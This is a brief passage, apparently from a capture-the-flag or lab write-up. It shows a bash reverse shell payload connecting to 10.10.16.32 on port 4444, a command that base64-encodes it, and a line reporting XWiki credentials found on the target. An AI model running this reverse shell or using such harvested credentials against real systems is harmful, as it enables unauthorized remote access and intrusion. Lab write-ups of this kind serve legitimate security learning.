...
```bash
# Payload: bash -i >& /dev/tcp/10.10.16.32/4444 0>&1
echo "bash -i >& /dev/tcp/10.10.16.32/4444 0>&1" | base64
...
**Credentials found:** `xwiki:theEd1t0rTeam99`
